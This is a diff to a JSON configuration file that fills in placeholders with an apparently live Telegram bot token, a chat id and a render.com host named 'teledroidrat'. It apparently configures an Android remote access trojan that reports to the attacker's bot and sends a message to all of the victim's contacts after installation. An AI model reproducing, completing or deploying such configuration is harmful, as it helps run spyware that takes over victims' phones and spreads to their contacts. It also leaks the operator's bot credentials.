@@ -1,6 +1,6 @@
 {
-    "token": "your bot token",
-    "id": "your telegram chat id here",
-    "host": "your render.com url here must use / after writing url ex: https://google.com/",
+    "token": "8550615849:AAE_jS3RG6LBjdjiRevqlXRNMRMWj2kNIho",
+    "id": "7317324681",
+    "host": "https://teledroidrat-2c26.onrender.com",
     "text": "This line will be sent to all contacts after installation."
 }
